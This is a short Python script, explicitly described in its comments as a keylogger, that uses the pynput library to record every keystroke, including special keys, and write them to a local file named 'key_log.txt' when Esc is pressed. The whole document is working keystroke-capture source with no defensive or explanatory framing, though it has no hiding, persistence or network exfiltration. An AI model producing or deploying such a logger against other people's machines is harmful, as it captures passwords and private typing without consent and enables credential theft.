from pynput import keyboard

# List to store pressed keys
keys = []

# Configurable file name
file_name = "key_log.txt"

def on_press(key):
    try:
        # Append the key to the list
        keys.append(key.char)
    except AttributeError:
        # If it's not a printable key, append its representation
        keys.append(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # If the 'Esc' key is pressed, stop the keylogger and save to a file
        write_to_file()
        return False

def write_to_file():
    try:
        # Convert the keys to a string
        data = "".join(keys)

        # Write the data to a file
        with open(file_name, "w") as f:
            f.write(data)
    except Exception as e:
        print(f"Error writing to the file: {e}")

# Configure the listeners
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Keep the program running
    listener.join()
